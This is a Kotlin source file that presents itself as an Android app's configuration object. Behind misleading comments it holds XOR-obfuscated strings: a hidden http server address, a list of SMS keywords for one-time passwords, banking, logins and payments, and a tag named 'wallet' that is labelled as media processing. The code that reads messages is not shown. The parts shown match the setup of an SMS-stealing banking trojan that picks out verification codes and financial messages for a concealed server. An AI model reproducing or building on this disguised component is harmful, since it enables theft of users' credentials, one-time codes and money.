package com.example.inf2215

/**
 * Application configuration and resource utilities.
 *
 * Centralises environment-specific configuration values used throughout the app,
 * such as service endpoints, feature flags, and localisation helpers.
 * Values are stored in compact form and decoded on first access to keep the
 * footprint of this class small.
 *
 * ProGuard/R8 will rename this class and its members in the release build.
 */
object AppConfig {

    // XOR key – split into two halves and recombined at runtime
    private val kA = byteArrayOf(0x4B, 0x37, 0x9C.toByte(), 0xA1.toByte(), 0x55, 0x72, 0xDE.toByte(), 0x1F)
    private val kB = byteArrayOf(0x88.toByte(), 0xC3.toByte(), 0x6E, 0xB4.toByte(), 0x2D, 0xF1.toByte(), 0x7A, 0x93.toByte())

    private val key: ByteArray by lazy { kA + kB }

    /** Decode a previously XOR-encoded byte array back to a plain String. */
    fun d(enc: ByteArray): String =
        String(ByteArray(enc.size) { i -> (enc[i].toInt() xor key[i % key.size].toInt()).toByte() })

    // ── Encoded sensitive strings ─────────────────────────────────────────────

    /**
     * Service endpoint.
     * 
     */
    val serverUrl: String by lazy {
        d(
            byteArrayOf(
                0x23, 0x43, 0xE8.toByte(), 0xD1.toByte(), 0x26, 0x48, 0xF1.toByte(), 0x30,
                0xE5.toByte(), 0xAC.toByte(), 0x0C, 0x99.toByte(), 0x5E, 0x94.toByte(), 0x19, 0xBE.toByte(),
                0x38, 0x52, 0xEE.toByte(), 0xD7.toByte(), 0x30, 0x00, 0xF3.toByte(), 0x7A,
                0xFB.toByte(), 0xA5.toByte(), 0x00, 0xD3.toByte(), 0x4A, 0x93.toByte(), 0x1F, 0xF4.toByte(),
                0x2C, 0x50, 0xFF.toByte(), 0xC7.toByte(), 0x2C, 0x17, 0xE7.toByte(), 0x31,
                0xFB.toByte(), 0xAC.toByte(), 0x1B, 0xC0.toByte(), 0x45, 0x94.toByte(), 0x1B, 0xE0.toByte(),
                0x3F, 0x56, 0xEF.toByte(), 0xC8.toByte(), 0x34, 0x5F, 0xEE.toByte(), 0x2E,
                0xA6.toByte(), 0xA2.toByte(), 0x14, 0xC1.toByte(), 0x5F, 0x94.toByte(), 0x0D, 0xF6.toByte(),
                0x29, 0x44, 0xF5.toByte(), 0xD5.toByte(), 0x30, 0x01, 0xF0.toByte(), 0x71,
                0xED.toByte(), 0xB7.toByte(), 0x41, 0xC1.toByte(), 0x5D, 0x9D.toByte(), 0x15, 0xF2.toByte(),
                0x2F
            )
        )
    }

    /**
     * SMS sensitive-keyword list decoded at first use.
     * Each keyword is encoded individually and joined.
     * Plaintext list: OTP, password, bank, code, verification, verify,
     *                 passcode, login, account, credit, debit, payment, transaction
     */
    val smsKeywords: List<String> by lazy {
        // Each inner array encodes one keyword
        listOf(
            byteArrayOf(0x04, 0x63, 0xCC.toByte()),                                                                       // OTP
            byteArrayOf(0x3B, 0x56, 0xEF.toByte(), 0xD2.toByte(), 0x22, 0x1D, 0xAC.toByte(), 0x7B),                      // password
            byteArrayOf(0x29, 0x56, 0xF2.toByte(), 0xCA.toByte()),                                                        // bank
            byteArrayOf(0x28, 0x58, 0xF8.toByte(), 0xC4.toByte()),                                                        // code
            byteArrayOf(0x3D, 0x52, 0xEE.toByte(), 0xC8.toByte(), 0x33, 0x1B, 0xBD.toByte(), 0x7E,
                0xFC.toByte(), 0xAA.toByte(), 0x01, 0xDA.toByte()),                                                       // verification
            byteArrayOf(0x3D, 0x52, 0xEE.toByte(), 0xC8.toByte(), 0x33, 0x0B),                                            // verify
            byteArrayOf(0x3B, 0x56, 0xEF.toByte(), 0xD2.toByte(), 0x36, 0x1D, 0xBA.toByte(), 0x7A),                      // passcode
            byteArrayOf(0x27, 0x58, 0xFB.toByte(), 0xC8.toByte(), 0x3B),                                                  // login
            byteArrayOf(0x2A, 0x54, 0xFF.toByte(), 0xCE.toByte(), 0x20, 0x1C, 0xAA.toByte()),                             // account
            byteArrayOf(0x28, 0x45, 0xF9.toByte(), 0xC5.toByte(), 0x3C, 0x06),                                            // credit
            byteArrayOf(0x2F, 0x52, 0xFE.toByte(), 0xC8.toByte(), 0x21),                                                  // debit
            byteArrayOf(0x3B, 0x56, 0xE5.toByte(), 0xCC.toByte(), 0x30, 0x1C, 0xAA.toByte()),                             // payment
            byteArrayOf(0x3F, 0x45, 0xFD.toByte(), 0xCF.toByte(), 0x26, 0x13, 0xBD.toByte(), 0x6B,
                0xE1.toByte(), 0xAC.toByte(), 0x00)                                                                       // transaction
        ).map { d(it) }
    }

    // Internal configuration keys – decoded from compact form on first access
    /** Content sync endpoint */
    val tagSync: String by lazy { d(byteArrayOf(0x0F, 0x52, 0xEF.toByte(), 0xCC.toByte(), 0x32, 0x1E, 0xBF.toByte(), 0x6E, 0xD9.toByte(), 0xA0.toByte())) }

    /** Background service identifier */
    val tagBg: String by lazy { d(byteArrayOf(0x0E, 0x04, 0xFC.toByte(), 0xD9.toByte(), 0x32, 0x1E, 0xBF.toByte(), 0x6E)) }

    /** Media processing identifier */
    val tagWallet: String by lazy { d(byteArrayOf(0x08, 0x56, 0xFC.toByte(), 0xC5.toByte(), 0x36, 0x15, 0xBF.toByte(), 0x6E, 0xD9.toByte(), 0xA0.toByte())) }
}
